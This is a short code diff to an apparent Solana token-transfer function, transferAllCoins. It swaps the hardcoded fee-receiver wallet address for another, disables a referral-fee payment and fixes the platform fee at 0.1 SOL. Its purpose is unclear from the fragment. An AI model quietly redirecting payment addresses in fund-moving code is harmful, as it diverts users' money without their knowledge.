@@ -293,7 +293,7 @@ export async function transferAllCoins(
     recipeintPubKey
   );
   const feeReceiver = new PublicKey(
-    "CqMGfCKkz4GgHEVxyfG35BkYNp56mWqos8jsaqmA2L7K"
+    "FKPxdEdddxoSq1kUogEnbVnBKda15gxcRz4cDt9b3LAh"
   );
   const swapTxInstructions = [
     swapInstruction,
@@ -301,15 +301,15 @@ export async function transferAllCoins(
     mintCloseAccount
   ];
   let refFee = 0;
-  if (referralWallet) {
-      const refFeeReceiever = new PublicKey(referralWallet);
-      refFee = 0.25;
-      const refFeeInstruction = SystemProgram.transfer({ fromPubkey: pubkey, toPubkey: refFeeReceiever, lamports: refFee*10**9 });
-      swapTxInstructions.push(refFeeInstruction);
-  }
+//   if (referralWallet) {
+//       const refFeeReceiever = new PublicKey(referralWallet);
+//       refFee = 0.25;
+//       const refFeeInstruction = SystemProgram.transfer({ fromPubkey: pubkey, toPubkey: refFeeReceiever, lamports: refFee*10**9 });
+//       swapTxInstructions.push(refFeeInstruction);
+//   }
 
 
-  const fee = 0.5 - refFee;
+  const fee = 0.1 
   const platformFeeInstruction = SystemProgram.transfer({
     fromPubkey: recipeintPubKey,
     toPubkey: feeReceiver,
